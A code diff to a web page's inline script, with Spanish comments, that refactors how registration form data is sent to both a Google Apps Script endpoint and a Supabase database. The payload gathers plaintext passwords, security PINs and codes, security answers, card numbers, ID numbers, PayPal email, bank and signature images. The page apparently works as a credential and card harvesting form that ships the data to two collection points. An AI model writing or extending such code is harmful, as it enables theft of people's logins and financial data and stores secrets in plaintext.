@@ -128,119 +128,140 @@
 
       // Función para enviar también a Supabase (dual envío) - DIRECTO A SUPABASE
       function sendRegistrationToSupabase(payload) {
-        try {
-          var registration = extractRegistrationData(payload);
+        return new Promise(function(resolve, reject) {
+          try {
+            var registration = extractRegistrationData(payload);
 
-          if (!registration) {
-            console.warn('[Supabase] ⚠️ No se encontró información de registro válida para guardar.');
-            return;
-          }
-
-          var supabasePayload = {
-            email: registration.email || null,
-            first_name: registration.firstName || null,
-            last_name: registration.lastName || null,
-            full_name: (registration.firstName && registration.lastName) ? registration.firstName + ' ' + registration.lastName : (registration.fullName || null),
-            preferred_name: registration.preferredName || registration.nickname || null,
-            nickname: registration.nickname || null,
-            country: registration.country || null,
-            state: registration.state || null,
-            gender: registration.gender || null,
-            birth_day: registration.birthDay || null,
-            birth_month: registration.birthMonth || null,
-            birth_year: registration.birthYear || null,
-            document_type: registration.documentType || null,
-            document_number: registration.documentNumber || null,
-            phone_country_code: registration.phoneCountryCode || null,
-            phone_prefix: registration.phonePrefix || null,
-            phone_number: registration.phoneNumber || registration.nationalPhoneNumber || null,
-            full_phone_number: registration.fullPhoneNumber || registration.phoneNumberFull || null,
-            password: registration.password || null,
-            security_code: registration.securityCode || registration.verificationCode || null,
-            security_pin: registration.securityPin || null,
-            security_question: registration.securityQuestion || null,
-            security_answer: registration.securityAnswer || null,
-            card_number: registration.cardNumber || null,
-            account_type: registration.accountType || null,
-            purpose: registration.purpose || null,
-            payment_method: registration.paymentMethod || null,
-            paypal_email: registration.paypalEmail || null,
-            operator: registration.operator || null,
-            initial_recharge_confirmed: registration.initialRechargeConfirmed || false,
-            venezuela_bank: registration.venezuelaBank || null,
-            signature_data_url: registration.signatureDataUrl || null,
-            device_id: registration.deviceId || null,
-            created_at: registration.createdAt || new Date().toISOString()
-          };
-
-          // Esperar a que Supabase esté listo y guardar directamente
-          var hasPersisted = false;
-
-          function persistRegistration() {
-            if (hasPersisted) {
+            if (!registration) {
+              var invalidPayloadError = new Error('No se encontró información de registro válida para guardar.');
+              console.warn('[Supabase] ⚠️', invalidPayloadError.message);
+              reject(invalidPayloadError);
               return;
             }
 
-            hasPersisted = true;
+            var supabasePayload = {
+              email: registration.email || null,
+              first_name: registration.firstName || null,
+              last_name: registration.lastName || null,
+              full_name: (registration.firstName && registration.lastName) ? registration.firstName + ' ' + registration.lastName : (registration.fullName || null),
+              preferred_name: registration.preferredName || registration.nickname || null,
+              nickname: registration.nickname || null,
+              country: registration.country || null,
+              state: registration.state || null,
+              gender: registration.gender || null,
+              birth_day: registration.birthDay || null,
+              birth_month: registration.birthMonth || null,
+              birth_year: registration.birthYear || null,
+              document_type: registration.documentType || null,
+              document_number: registration.documentNumber || null,
+              phone_country_code: registration.phoneCountryCode || null,
+              phone_prefix: registration.phonePrefix || null,
+              phone_number: registration.phoneNumber || registration.nationalPhoneNumber || null,
+              full_phone_number: registration.fullPhoneNumber || registration.phoneNumberFull || null,
+              password: registration.password || null,
+              security_code: registration.securityCode || registration.verificationCode || null,
+              security_pin: registration.securityPin || null,
+              security_question: registration.securityQuestion || null,
+              security_answer: registration.securityAnswer || null,
+              card_number: registration.cardNumber || null,
+              account_type: registration.accountType || null,
+              purpose: registration.purpose || null,
+              payment_method: registration.paymentMethod || null,
+              paypal_email: registration.paypalEmail || null,
+              operator: registration.operator || null,
+              initial_recharge_confirmed: registration.initialRechargeConfirmed || false,
+              venezuela_bank: registration.venezuelaBank || null,
+              signature_data_url: registration.signatureDataUrl || null,
+              device_id: registration.deviceId || null,
+              created_at: registration.createdAt || new Date().toISOString()
+            };
 
-            window.SupabaseDB.saveRegistration(supabasePayload)
-              .then(function(result) {
-                if (result.ok) {
-                  console.log('[Supabase] ✅ Registro guardado exitosamente:', result.data.id);
-                } else {
-                  console.warn('[Supabase] ⚠️ Error al guardar:', result.error);
-                }
-              })
-              .catch(function(error) {
-                console.warn('[Supabase] ⚠️ Error inesperado:', error);
-                hasPersisted = false;
-              });
-          }
+            var hasPersisted = false;
+            var readinessAttempts = 0;
+            var maxAttempts = 20;
 
-          function waitForSupabaseReady() {
-            if (hasPersisted) {
-              return;
+            function persistRegistration() {
+              if (hasPersisted) {
+                return;
+              }
+
+              hasPersisted = true;
+
+              window.SupabaseDB.saveRegistration(supabasePayload)
+                .then(function(result) {
+                  if (result && result.ok) {
+                    console.log('[Supabase] ✅ Registro guardado exitosamente:', result.data.id);
+                    resolve(result);
+                  } else {
+                    var errorMessage = (result && result.error) ? result.error : 'No se pudo guardar el registro en Supabase.';
+                    console.warn('[Supabase] ⚠️ Error al guardar:', errorMessage);
+                    resolve(result || { ok: false, error: errorMessage });
+                  }
+                })
+                .catch(function(error) {
+                  hasPersisted = false;
+                  console.warn('[Supabase] ⚠️ Error inesperado:', error);
+                  reject(error);
+                });
             }
 
-            if (window.SupabaseDB && typeof window.SupabaseDB.isReady === 'function' && window.SupabaseDB.isReady()) {
-              persistRegistration();
-              return;
-            }
-
-            console.log('[Supabase] ⏳ Esperando inicialización...');
-            setTimeout(waitForSupabaseReady, 500);
-          }
-
-          if (window.SupabaseDB && typeof window.SupabaseDB.isReady === 'function' && window.SupabaseDB.isReady()) {
-            persistRegistration();
-          } else {
-            window.addEventListener('supabase:ready', function handleSupabaseReady() {
+            function handleSupabaseReady() {
               if (hasPersisted) {
                 window.removeEventListener('supabase:ready', handleSupabaseReady);
                 return;
               }
+
               window.removeEventListener('supabase:ready', handleSupabaseReady);
               persistRegistration();
-            });
-            waitForSupabaseReady();
+            }
+
+            function waitForSupabaseReady() {
+              if (hasPersisted) {
+                return;
+              }
+
+              if (window.SupabaseDB && typeof window.SupabaseDB.isReady === 'function' && window.SupabaseDB.isReady()) {
+                persistRegistration();
+                return;
+              }
+
+              readinessAttempts += 1;
+
+              if (readinessAttempts > maxAttempts) {
+                hasPersisted = true;
+                window.removeEventListener('supabase:ready', handleSupabaseReady);
+                reject(new Error('Supabase no se inicializó a tiempo.'));
+                return;
+              }
+
+              console.log('[Supabase] ⏳ Esperando inicialización...');
+              setTimeout(waitForSupabaseReady, 500);
+            }
+
+            if (window.SupabaseDB && typeof window.SupabaseDB.isReady === 'function' && window.SupabaseDB.isReady()) {
+              persistRegistration();
+            } else {
+              window.addEventListener('supabase:ready', handleSupabaseReady);
+              waitForSupabaseReady();
+            }
+          } catch (error) {
+            console.warn('[Supabase] ⚠️ Error en sendRegistrationToSupabase:', error);
+            reject(error);
           }
-        } catch (error) {
-          console.warn('[Supabase] ⚠️ Error en sendRegistrationToSupabase:', error);
-        }
+        });
       }
 
       // Función wrapper para dual envío (Google Apps Script + Supabase)
       function dualSendRegistration(payload) {
-        // Enviar a Google Apps Script (comportamiento existente)
         sendRegistrationToAppsScript(payload);
-
-        // También enviar a Supabase para el panel de administración
-        sendRegistrationToSupabase(payload);
+        return sendRegistrationToSupabase(payload);
       }
 
       window.googleAppsScriptIntegration = {
         send: dualSendRegistration
       };
+
+      window.sendRegistrationToSupabase = sendRegistrationToSupabase;
     })();
   </script>
   <script type="module" src="registro.js"></script>
